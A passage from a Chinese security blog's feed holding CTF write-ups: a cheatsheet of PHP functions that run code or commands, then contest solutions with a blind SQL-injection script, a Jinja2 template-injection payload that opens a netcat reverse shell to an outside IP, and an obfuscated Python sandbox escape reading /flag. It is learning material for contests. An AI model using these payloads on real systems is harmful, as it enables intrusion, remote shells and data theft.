class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$func =create_function(<span class="string">''</span>,<span class="string">'code'</span>);</span><br><span class="line">$func();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><p>call_user_func — 把第一个参数作为回调函数调用，第二个作为传入被回掉函数的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">call_user_func (<span class="string">'func'</span>,<span class="string">'arge'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><p>调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$arge[<span class="number">0</span>]=<span class="string">'arge'</span>;</span><br><span class="line">call_user_func (<span class="string">'func'</span>,$arge);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h4><p>函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$arge[<span class="number">0</span>]=<span class="string">'arge'</span>;</span><br><span class="line">array_map(<span class="string">'func'</span>,$arge);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h4><p>用回调函数过滤数组中的单元</p><p><code>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</code></p><p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$arge[<span class="number">0</span>]=<span class="string">'arge'</span>;</span><br><span class="line">array_filter (<span class="string">'func'</span>,$arge);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="array-walk"><a href="#array-walk" class="headerlink" title="array_walk"></a>array_walk</h4><p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。(同时传两个键名和键值参数)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myfunction</span><span class="params">($value,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The key $key has the value $value&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"red"</span>,<span class="string">"b"</span>=&gt;<span class="string">"green"</span>,<span class="string">"c"</span>=&gt;<span class="string">"blue"</span>);</span><br><span class="line">array_walk($a,<span class="string">"myfunction"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h4><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">$a[<span class="number">1</span>]=<span class="string">'phpinfo()'</span>;</span><br><span class="line">usort($a,<span class="string">'assert'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h4><p>uasort — 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">$a[<span class="number">1</span>]=<span class="string">'phpinfo()'</span>;</span><br><span class="line">uasort($a,<span class="string">'assert'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="FFI-cdef"><a href="#FFI-cdef" class="headerlink" title="FFI::cdef"></a>FFI::cdef</h4><p>创建一个新的FFI对象,可以把c语言的函数声明出来。以调用c语言system函数为例。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::cdef(<span class="string">"int system(const char *command);"</span>);//创建一个system对象</span><br><span class="line">$a=<span class="string">'ls &gt; 1.txt'</span>;//没有回显的</span><br><span class="line">$ffi-&gt;system($a);//通过$ffi去调用system函数</span><br></pre></td></tr></table></figure><h2 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h2><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>system — 执行外部程序，并且显示输出.如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。成功则返回命令输出的最后一行， 失败则返回 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">system(<span class="string">'commande'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>exec() 执行 command 参数所指定的命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> exec (<span class="string">'commande'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。反引号（’’`commande`“）的本质是shell_exec。</p><p>(当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 NULL)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> shell_exec (<span class="string">'commande'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> passthru(<span class="string">'commande'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php对文件系统处理函数"><a href="#php对文件系统处理函数" class="headerlink" title="php对文件系统处理函数"></a>php对文件系统处理函数</h2><h4 id="ini-set"><a href="#ini-set" class="headerlink" title="ini_set"></a>ini_set</h4><p>对php.ini文件里的一些对PHP_INI_USER or PHP_INI_ALL 的配置进行临时的更改.</p><p>常见的更改:</p><ol><li><p><strong>include_path</strong> :当寻找要包含的文件时，PHP会分别考虑包含路径中的每个条目。它将检查第一个路径，如果找不到，则检查下一个路径，直到找到包含的文件或返回带有E_WARNING 或的为止 E_ERROR。</p></li><li><p><strong>open_basedir</strong>:当脚本尝试访问文件系统时，例如使用 include或fopen（），将检查文件的位置。当文件在指定的目录树之外时，PHP将拒绝访问它。(自PHP 5.2.16和5.3.4起， 用open_basedir指定的限制是目录名。以前的版本将其用作前缀。这意味着“ open_basedir = /dir/incl”还允许访问“ /dir/include”和“ /dir/incls”（如果存在）。当您只想限制对指定目录的访问时，请以斜杠结尾。例如： open_basedir = /dir/incl/)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> ini_set(<span class="string">'tage'</span><span class="string">'vlue'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="set-include-path"><a href="#set-include-path" class="headerlink" title="set_include_path"></a>set_include_path</h4><p>专门设置<strong>include_path</strong>路径的函数。</p><h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir"></a>chdir</h4><p>将 更改当前目录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> chdir(<span class="string">'dir'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h4><p>scandir — 列出指定路径中的文件和目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">scandir ( <span class="string">'dir'</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>highlight_file — 语法高亮一个文件.(可以处理协议)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">highlight_file(<span class="string">'file'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h4><p>highlight_file函数的别名，具体用法同highlight_file。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">show_source(<span class="string">'file'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.php.net/manual/zh/ref.exec.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.exec.php</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10819069.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届上海市大学生网络安全大赛-初赛wp</title>
      <link href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/"/>
      <url>/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>周末去打了下上海市，虽然有的是原题魔改但感觉有点题还是有点意思，故书之。<a id="more"></a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="千毒网盘"><a href="#千毒网盘" class="headerlink" title="千毒网盘"></a>千毒网盘</h3><p>从<code>www.zip</code>获得了原码。审查原码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>, <span class="string">'_POST'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)</span><br><span class="line">&#123;   </span><br><span class="line"><span class="keyword">if</span>($$key) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($$key <span class="keyword">as</span> $key_2 =&gt; $value_2) &#123; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($$key_2) <span class="keyword">and</span> $$key_2 == $value_2) </span><br><span class="line"><span class="keyword">unset</span>($$key_2); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) $_POST[<span class="string">'code'</span>] = $pan-&gt;filter($_POST[<span class="string">'code'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$message = $pan-&gt;getfile();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;div class="alert alert-dismissable alert-info"&gt;</span></span><br><span class="line"><span class="string"> &lt;button type="button" class="close" data-dismiss="alert" aria-hidden="true"&gt;×&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;h4&gt;</span></span><br><span class="line"><span class="string">注意!</span></span><br><span class="line"><span class="string">&lt;/h4&gt; &lt;strong&gt;注意!&lt;/strong&gt; <span class="subst">&#123;$message&#125;</span></span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有可以变量覆盖绕过waf。及get提交一个<code>_POST[&#39;code&#39;]</code> 就可以让post中code覆盖掉。(注意编码就行。)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://eci-2zeikzil0vb2fhx1hg0q.cloudeci1.ichunqiu.com/index.php?_POST[code]='</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"eci-2ze5g0l1bms27122px6b.cloudeci1.ichunqiu.com"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctf</span></span><br><span class="line"><span class="comment">#file,flag</span></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">max = <span class="number">255</span></span><br><span class="line">min = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min)&gt;<span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">pay = <span class="string">"233333' and if(ascii(substr((select flag from flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#"</span>.format(i,mid)</span><br><span class="line">data = &#123;<span class="string">"code"</span>: pay&#125;</span><br><span class="line">pay2 = <span class="string">"233333' and if(ascii(substr((select flag from flag),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23"</span>.format(i,mid)</span><br><span class="line">r = requests.post(url=url+pay2,data=data,headers=headers)</span><br><span class="line"><span class="comment"># print url+pay</span></span><br><span class="line"><span class="comment"># print data</span></span><br><span class="line"><span class="comment"># print r.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'http://127.0.0.1/2333.gif'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line">res += chr(max)</span><br><span class="line"><span class="keyword">if</span> chr(max) <span class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h3 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h3><p>进入题目,根据提示得到了原码.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'/flag'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">"name"</span>) <span class="keyword">or</span> <span class="string">""</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/help',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">()</span>:</span></span><br><span class="line">    help = <span class="string">'''</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">'rm -f /flag'</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">"name"</span>) <span class="keyword">or</span> <span class="string">""</span></span><br><span class="line">    <span class="comment"># r = request.path</span></span><br><span class="line">    r = request.data.decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">'popen'</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">'&#123;&#123;'</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">" Not found!"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">" Not found!"</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>@app.errorhandler(404)</code>有ssti。</p><p>先访问不存在页面，然后抓包修改为post传参即可绕过page_no_found，然后过滤了一些关键字，字符拼接和’{  %’。由于是无回显，且删除了flag。推测’在linux里如果打开了一个文件而没有关闭，就算删除了文件（即rm -f flag）在/proc/[pid]/fd下还是会存在’的考点，尝试反弹shell，在进程里面找到flag。最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%if &#39;p&#39;+&#39;open&#39;&#x3D;&#x3D;os[&#39;p&#39;+&#39;open&#39;](&#39;nc 39.100.119.234 8080 -t -e &#x2F;bin&#x2F;bash&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>{echo,ZmxhZ3t3MzFjMG1lNX0=}|{base64,-d}|{tr,5,6} 分析这段代码，怀疑是linux 的命令结果理解，解base64后，将5替换成6.即得到flag。</p><h3 id="pcap-analysis"><a href="#pcap-analysis" class="headerlink" title="pcap analysis"></a>pcap analysis</h3><p>对Modbus协议进行追踪，在分析Modbus协议写寄存器的数据数据时发现 ：</p><p><img src="image-20201115183623046.png" alt="image-20201115183623046">s</p><p>拼接后即得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-show_原谅杯wp</title>
      <link href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/"/>
      <url>/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>趁着双十一嘛,在集训的时候摸鱼去原谅杯看了看</p><a id="more"></a><h2 id="原谅1"><a href="#原谅1" class="headerlink" title="原谅1"></a>原谅1</h2><p>进入题目看到的就是一张抽象图片.</p><p><img src="image-20201112124008591.png" alt="image-20201112124008591"></p><p>推测应该暗示压缩包密码,前几位推测是<code>1317</code>后面不知道于是采用掩码攻击.</p><p>得到密码后提取压缩包得到一个1.jpg.用stegsolve找到flag.</p><p><img src="image-20201112124424057.png" alt="image-20201112124424057"></p><h2 id="原谅2"><a href="#原谅2" class="headerlink" title="原谅2"></a>原谅2</h2><p>考的是文件隐写与火星文加密.</p><p>用binwalk 提前压缩包,发现出了个hint.txt</p><p><img src="image-20201112122935678.png" alt="image-20201112122935678"></p><p>打开发现疑似有火星文加密.</p><p>解密:<code>佛曰wohsftc学废了适就是压缩包的key</code>(之前刚做的时,把wohsftc倒置了,结果发现不用倒置)</p><p>用解出的密码,解压压缩包就得到了flag</p><h2 id="原谅3"><a href="#原谅3" class="headerlink" title="原谅3"></a>原谅3</h2><p>一个php的rce但是过滤了很多读取文件的命令,最后发现可以用php来读取出来.(php tql!)</p><p><img src="image-20201112124830058.png" alt="image-20201112124830058"></p><h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>进入发现是个python的远程rce,但过滤了不少.而且返回值类型还有了限制.</p><p>偶然间发现dir函数还没被过滤.执行查看.</p><p><img src="image-20201112115723078.png" alt="image-20201112115723078"></p><p>发现有一个奇怪的变量<code>kiword</code>,查看一下发现了’chr’字符串</p><p><img src="image-20201112115753581.png" alt="image-20201112115753581"></p><p>由于有dir()函数在,推测环境中<code>__builtins__</code>及其类中含有的方法也在环境中.</p><p>所以尝试用getattr方法绕waf获得flag.</p><p>经过尝试通过<code>getattr(__builtins__,kiword)</code>获得了chr函数</p><p>再通过chr函数拼接出更多的字符串.再利用getattr方法套娃来构造:</p><p><code>__import__(&quot;os&quot;).popen().read</code></p><p>从而获得对面的shell来读取flag.</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x3D;getattr(getattr(__builtins__,getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95))(getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)),getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110))(getattr(__builtins__,kiword)(99)+getattr(__builtins__,kiword)(97)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(32)+getattr(__builtins__,kiword)(47)+getattr(__builtins__,kiword)(102)+getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(97)+getattr(__builtins__,kiword)(103)).read()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> mics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-show 1024杯</title>
      <link href="/2020/10/26/ctf-show%201024%E6%9D%AF/"/>
      <url>/2020/10/26/ctf-show%201024%E6%9D%AF/</url>
      
